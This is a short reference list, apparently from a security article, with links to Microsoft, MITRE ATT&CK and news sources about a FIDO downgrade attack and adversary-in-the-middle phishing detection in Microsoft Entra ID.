- Microsoft Entra ID FIDO Compatibility: https://learn.microsoft.com/en-us/entra/identity/authentication/concept-fido2-compatibility
- MITRE ATT&CK T1556.006: https://attack.mitre.org/techniques/T1556/006/
- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
- BleepingComputer (August 2025): https://www.bleepingcomputer.com/news/security/new-downgrade-attack-can-bypass-fido-auth-in-microsoft-entra-id/
- Microsoft 365 Defender AiTM Detection: https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/atp-anti-phishing
- TechCommunity: Detecting AiTM Phishing: https://techcommunity.microsoft.com/blog/microsoftsentinelblog/identifying-adversary-in-the-middle-aitm-phishing-attacks

---